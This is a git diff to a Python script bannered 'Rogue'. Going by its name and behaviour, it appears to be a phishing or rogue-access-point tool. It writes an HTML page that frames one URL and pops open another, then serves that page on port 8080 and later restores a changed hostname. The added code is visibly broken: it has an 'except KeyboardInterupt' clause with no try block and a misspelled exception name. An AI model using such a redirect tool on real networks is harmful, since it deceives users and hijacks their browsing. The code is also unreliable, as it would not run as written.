@@ -1,5 +1,6 @@
 import os
 import sys
+from time import sleep
 
 print("Rogue         ___ ___________  ___    ___")
 print("/-----------| |_| | _________| | |    | |")
@@ -44,3 +45,15 @@ elif red == True:
    opew = ope.write("<html> \n <head> \n \t <iframe src="{}"> \n </head> \n <body> \n \t <script> window.open("{}") </script> \n </body> \n </html>".format(cpurl, site))
 else:
    pass
+ope.close()
+print("starting server...")
+print("sever started.")
+print("press ctrl + c to quit")
+os.system("python3 -m http.server 8080")
+except KeyboardInterupt:
+   print("Restoring...")
+   os.system("hostname {}".format(opr))
+   sleep(0.5)
+   print("closing...")
+   sleep(0.5)
+   print("closed")
